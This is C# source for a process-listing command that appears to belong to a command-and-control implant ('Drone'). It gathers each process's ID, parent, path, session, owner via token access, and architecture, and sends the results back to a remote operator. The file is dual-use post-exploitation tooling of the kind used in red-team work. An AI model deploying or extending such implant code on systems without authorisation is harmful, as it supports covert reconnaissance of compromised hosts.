using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

using ProtoBuf;

namespace Drone.Commands;

public sealed class ListProcesses : DroneCommand
{
    public override byte Command => 0x0B;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        List<ProcessEntry> results = new();
        
        var processes = Process.GetProcesses();

        foreach (var process in processes)
        {
            results.Add(new ProcessEntry
            {
                ProcessId = process.Id,
                ParentProcessId = GetProcessParent(process),
                Name = process.ProcessName,
                Path = GetProcessPath(process),
                SessionId = process.SessionId,
                Owner = GetProcessOwner(process),
                Arch = GetProcessArch(process)
            });
        }

        await Drone.SendDroneTaskOutput(new DroneTaskResponse
        {
            TaskId = task.Id,
            Status = DroneTaskStatus.Complete,
            Module = Command,
            Output = results.Serialize()
        });
    }
    
    private static int GetProcessParent(Process process)
    {
        try
        {
            var pbi = Native.QueryProcessBasicInformation(process.Handle);
            return pbi.InheritedFromUniqueProcessId;
        }
        catch
        {
            return 0;
        }
    }
    
    private static string GetProcessPath(Process process)
    {
        try
        {
            return process.MainModule?.FileName;
        }
        catch
        {
            return string.Empty;
        }
    }
    
    private static string GetProcessOwner(Process process)
    {
        try
        {
            var hToken = Win32.OpenProcessToken(
                process.Handle,
                Win32.TOKEN_ACCESS.TOKEN_ALL_ACCESS);

            if (hToken == IntPtr.Zero)
                return string.Empty;

            using var identity = new WindowsIdentity(hToken);
            Win32.CloseHandle(hToken);
            return identity.Name;
        }
        catch
        {
            return string.Empty;
        }
    }
    
    private static string GetProcessArch(Process process)
    {
        if (!Environment.Is64BitOperatingSystem)
            return "x86";
        
        try
        {
            return Native.NtQueryInformationProcessWow64Information(process.Handle) ? "x86" : "x64";
        }
        catch
        {
            return string.Empty;
        }
    }
}

[ProtoContract]
public sealed class ProcessEntry
{
    [ProtoMember(1)]
    public int ProcessId { get; set; }
    
    [ProtoMember(2)]
    public int ParentProcessId { get; set; }
    
    [ProtoMember(3)]
    public string Name { get; set; }
    
    [ProtoMember(4)]
    public string Path { get; set; }
    
    [ProtoMember(5)]
    public int SessionId { get; set; }
    
    [ProtoMember(6)]
    public string Owner { get; set; }
    
    [ProtoMember(7)]
    public string Arch { get; set; }
}